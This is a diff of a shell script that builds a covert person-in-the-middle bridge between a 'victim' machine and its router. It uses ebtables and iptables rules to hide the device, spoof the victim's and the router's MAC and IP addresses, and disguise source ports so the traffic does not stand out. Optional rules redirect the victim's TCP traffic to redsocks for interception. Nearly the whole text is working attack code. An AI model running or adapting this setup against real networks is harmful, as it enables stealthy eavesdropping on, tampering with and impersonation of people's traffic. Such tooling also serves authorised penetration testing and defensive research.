@@ -18,14 +18,22 @@ victim_mac=${victim_mac:-02:00:00:00:00:01}
 victim_ip=${victim_ip:-192.168.1.2}
 router_mac=${router_mac:-02:00:00:00:00:02}
 router_ip=${router_ip:-192.168.1.1}
-victim_dev=${victim_dev:-eth0.1}
-router_dev=${router_dev:-eth0.2}
-br_dev=${br_dev:-br-mitm}
+
+# Override the various device names if required
+victim_dev=${victim_dev:-lan}
+router_dev=${router_dev:-wan}
+br_dev=${br_dev:-pitm}
+
+# These values are essentially randomly chosen, not important other than as markers
+# in ebtables and iptables rules, to be translated to the victim and router values
+# If all goes well, these should never be seen outside of this device
+br_dev_mac=${br_dev_mac:-0:1:1:1:1:1}
+br_dev_ip=${br_dev_ip:-169.254.0.1}
 
 # make sure iptables is called at various levels
-sysctl -w net.bridge.bridge-nf-call-arptables=1
-sysctl -w net.bridge.bridge-nf-call-ip6tables=1
-sysctl -w net.bridge.bridge-nf-call-iptables=1
+sysctl -q -w net.bridge.bridge-nf-call-arptables=1
+sysctl -q -w net.bridge.bridge-nf-call-ip6tables=1
+sysctl -q -w net.bridge.bridge-nf-call-iptables=1
 
 # clear existing firewall rules
 ebtables -t filter -F
@@ -35,48 +43,72 @@ iptables -t nat -F
 iptables -t mangle -F
 iptables -t raw -F
 
-# Make sure we don't send any packets with our own identity to multicast addresses
-# see https://en.wikipedia.org/wiki/Multicast_address
-ebtables -t filter -A OUTPUT -s 0:1:1:1:1:1 -d ff:ff:ff:ff:ff:ff -j DROP 
-ebtables -t filter -A OUTPUT -s 0:1:1:1:1:1 -d 01:00:5e:00:00:01 -j DROP
-ebtables -t filter -A OUTPUT -s 0:1:1:1:1:1 -d 33:33:00:00:00:01 -j DROP
+# Safety Rules: Make sure we don't send any packets with our own identity
+victim_dev_mac=$(ip addr show ${victim_dev} | grep ether | (read null ether null ; echo $ether))
+router_dev_mac=$(ip addr show ${router_dev} | grep ether | (read null ether null ; echo $ether))
+ebtables -t nat -I POSTROUTING -s ${br_dev_mac} -j DROP
+ebtables -t nat -I POSTROUTING -s ${victim_dev_mac} -j DROP
+ebtables -t nat -I POSTROUTING -s ${router_dev_mac} -j DROP
+
+# Make sure we don't send any traffic of our own to Multicast or Bridge Group Addresses
+ebtables -t filter -I OUTPUT -d Multicast -j DROP
+ebtables -t filter -I OUTPUT -d BGA -j DROP
+
+# Make sure the bridge is up
+if ! brctl show $br_dev > /dev/null 2>&1 ; then
+	brctl addbr $br_dev
+	brctl addif $br_dev $victim_dev $router_dev
+fi
 
 # Configure the two interfaces of the bridge
-# Make sure they do no generate any of their own ARP traffic
-ifconfig $victim_dev -arp up
-ifconfig $router_dev -arp up
-ifconfig $br_dev 169.254.0.1 netmask 255.255.255.0 -arp up
-ip link set dev $br_dev address 0:1:1:1:1:1 arp off
+# Make sure they do not generate any of their own ARP traffic
+ip addr flush dev $victim_dev
+ip addr flush dev $router_dev
+ip addr flush dev $br_dev
+ip link set dev $victim_dev arp off
+ip link set dev $router_dev arp off
+ip link set dev $br_dev address ${br_dev_mac} arp off
+ip addr add dev $br_dev ${br_dev_ip}/24
+ip link set dev $br_dev up
+ip link set dev $victim_dev up
+ip link set dev $router_dev up
 
 # Make sure we can reach both our victim and the router
 ip neigh replace $victim_ip lladdr $victim_mac dev $br_dev
-route add $victim_ip dev $br_dev
 ip neigh replace $router_ip lladdr $router_mac dev $br_dev
-route add $router_ip dev $br_dev
+ip route replace $victim_ip dev $br_dev
+ip route replace $router_ip dev $br_dev
 
 # Optional: Allows routing to the rest of the network
-# route add default gw $router_ip
+# It is generally best to be specific about this, to avoid leaking unrelated traffic
+# ip route add 10.0.0.0/24 via $router_ip || ip route change 10.0.0.0/24 via $route_ip
 
-# Any packets sent to anyone other than the victim appear to come from the victim MAC
-ebtables -t nat -A POSTROUTING -s 0:1:1:1:1:1 ! -d $victim_mac -j snat --to-source $victim_mac
-# Any packets to anyone other than the victim appear to come from the victim IP address
-iptables -t nat -A POSTROUTING -p tcp -s 169.254.0.1 ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
-iptables -t nat -A POSTROUTING -p udp -s 169.254.0.1 ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
-iptables -t nat -A POSTROUTING -p icmp -s 169.254.0.1 ! -d $victim_ip -j SNAT --to $victim_ip
+# Any packets sent to anyone other than the victim appear to come from the victim MAC/IP
+# Any packets sent to the victim appear to come from the router MAC/IP
+# Rules are sorted in reverse order because they are inserted at the top of the list, and
+# therefore get pushed down as each new entry is added
+# This is particularly important for ebtables, because we need to be before the "safety" rules
+ebtables -t nat -I POSTROUTING -s ${br_dev_mac} ! -d $victim_mac -j snat --to-source $victim_mac
+ebtables -t nat -I POSTROUTING -s ${br_dev_mac}   -d $victim_mac -j snat --to-source $router_mac
 
-# Any packets sent to the victim appear to come from the router MAC
-ebtables -t nat -A POSTROUTING -s 0:1:1:1:1:1 -d $victim_mac -j snat --to-source $router_mac
-# Any packets to the victim appear to come from the router IP address
-iptables -t nat -A POSTROUTING -p tcp -s 169.254.0.1 -d $victim_ip -j SNAT --to $router_ip:27000-32000
-iptables -t nat -A POSTROUTING -p udp -s 169.254.0.1 -d $victim_ip -j SNAT --to $router_ip:27000-32000
-iptables -t nat -A POSTROUTING -p icmp -s 169.254.0.1 -d $victim_ip -j SNAT --to $router_ip
+iptables -t nat -I POSTROUTING -s ${br_dev_ip}  ! -d $victim_ip -j SNAT --to $victim_ip
+iptables -t nat -I POSTROUTING -s ${br_dev_ip}    -d $victim_ip -j SNAT --to $router_ip
+
+# We special case TCP and UDP to be able to rewrite the source ports so as not to stand out
+# This range is suitable for a predominantly Windows network
+iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
+iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
+
+iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
+iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
 
 # optional: Direct any traffic from the victim to hit redsocks, for interception by Mallet, etc
 # create a custom chain
+iptables -t nat -X REDSOCKS 2> /dev/null
 iptables -t nat -N REDSOCKS
 iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345
 
-# Make sure that traffic to or from the victim enters the REDSOCKS chain
+# Select traffic of interest to enter the REDSOCKS chain
 # iptables -t nat -I PREROUTING 1 -p tcp -s $victim_ip -j REDSOCKS
 # iptables -t nat -I PREROUTING 1 -p tcp -d $victim_ip -j REDSOCKS
 
